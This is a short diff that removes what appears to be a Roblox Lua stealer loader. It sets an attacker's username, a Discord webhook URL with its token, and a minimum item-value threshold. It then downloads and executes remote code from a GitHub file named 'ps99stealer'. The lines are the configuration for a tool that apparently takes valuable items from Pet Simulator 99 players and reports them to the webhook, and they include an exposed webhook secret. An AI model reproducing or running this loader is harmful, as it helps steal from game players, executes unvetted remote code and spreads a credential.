@@ -1,6 +1,0 @@
-Username= 'duditoq3'
-Webhook= 'https://discord.com/api/webhooks/1283230603285626952/2Jb3GlifuiB-xCULKGajQLzOg023m2rjuxrFhnJaEsWJJQhR1L7tlVtHxpIGY09Gt-_8'
- 
-MinimumRAP = 500000
- 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/IanWP411/Putinkamailstealer/main/ps99stealer",true))()
